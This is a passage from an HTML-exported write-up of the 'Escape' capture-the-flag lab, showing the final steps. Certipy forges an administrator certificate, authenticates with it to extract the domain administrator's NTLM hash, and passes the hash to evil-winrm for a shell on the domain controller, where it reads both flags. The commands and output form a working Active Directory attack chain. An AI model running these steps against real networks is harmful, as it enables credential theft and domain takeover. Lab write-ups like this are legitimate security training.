+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 16
+[*] Successfully requested certificate
+[*] Got certificate with UPN &apos;administrator@sequel.htb&apos;
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to &apos;administrator.pfx&apos;
+File &apos;administrator.pfx&apos; already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to &apos;administrator.pfx&apos;
+
+</code></pre></div>
+<p>And then finally authenticate as administrator to obtain the NTLM hash of the domain administrator:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ sudo ntpdate -s 10.129.228.253                              
+                                                                                                                                                                                                                           
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &apos;administrator@sequel.htb&apos;
+[*] Using principal: &apos;administrator@sequel.htb&apos;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &apos;administrator.ccache&apos;
+File &apos;administrator.ccache&apos; already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to &apos;administrator.ccache&apos;
+[*] Trying to retrieve NT hash for &apos;administrator&apos;
+[*] Got hash for &apos;administrator@sequel.htb&apos;: aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ sudo ntpdate -s 10.129.228.253                              
+                                                                                                                                                                                                                           
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &apos;administrator@sequel.htb&apos;
+[*] Using principal: &apos;administrator@sequel.htb&apos;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &apos;administrator.ccache&apos;
+File &apos;administrator.ccache&apos; already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to &apos;administrator.ccache&apos;
+[*] Trying to retrieve NT hash for &apos;administrator&apos;
+[*] Got hash for &apos;administrator@sequel.htb&apos;: aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</code></pre></div>
+<p>Use the NTLM hash to obtain a shell on the DC:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ evil-winrm -i 10.129.228.253 -u Administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee     
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+sequel\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::ec1e:a44f:6d0d:6100
+   Link-local IPv6 Address . . . . . : fe80::ec1e:a44f:6d0d:6100%4
+   IPv4 Address. . . . . . . . . . . : 10.129.228.253
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%4
+                                       10.129.0.1
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ evil-winrm -i 10.129.228.253 -u Administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee     
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+sequel\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::ec1e:a44f:6d0d:6100
+   Link-local IPv6 Address . . . . . : fe80::ec1e:a44f:6d0d:6100%4
+   IPv4 Address. . . . . . . . . . . : 10.129.228.253
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%4
+                                       10.129.0.1
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </code></pre></div>
+<p>The two flags:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd C:\
+*Evil-WinRM* PS C:\&gt; cd Users
+*Evil-WinRM* PS C:\Users&gt; dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/7/2023   8:58 AM                Administrator
+d-r---        7/20/2021  12:23 PM                Public
+d-----         2/1/2023   6:37 PM                Ryan.Cooper
+d-----         2/7/2023   8:10 AM                sql_svc
+
+
+*Evil-WinRM* PS C:\Users&gt; more Administrator\Desktop\root.txt
+6753688be648050e5bd3be8fdf6102e4
+
+*Evil-WinRM* PS C:\Users&gt; more Ryan.Cooper\Desktop\user.txt
+4f9bb7d68a16ff30a786243c7fd07b20
+
+*Evil-WinRM* PS C:\Users&gt; </pre><pre class="hljs"><code>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="hljs-keyword">cd</span> C:\
+*Evil-WinRM* PS C:\&gt; <span class="hljs-keyword">cd</span> Users
+*Evil-WinRM* PS C:\Users&gt; dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+<span class="hljs-params">----</span>                <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span>
+d<span class="hljs-params">-----</span>         2/7/2023   8<span class="hljs-function">:58</span> AM                Administrator
+d-r<span class="hljs-params">---</span>        7/20/2021  12<span class="hljs-function">:23</span> PM                Public
+d<span class="hljs-params">-----</span>         2/1/2023   6<span class="hljs-function">:37</span> PM                Ryan.Cooper
+d<span class="hljs-params">-----</span>         2/7/2023   8<span class="hljs-function">:10</span> AM                sql_svc
+
+
+*Evil-WinRM* PS C:\Users&gt; more Administrator\Desktop\root.txt
+6753688be648050e5bd3be8fdf6102e4
+
+*Evil-WinRM* PS C:\Users&gt; more Ryan.Cooper\Desktop\user.txt
+4f9bb7d68a16ff30a786243c7fd07b20
+
+*Evil-WinRM* PS C:\Users&gt; </code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
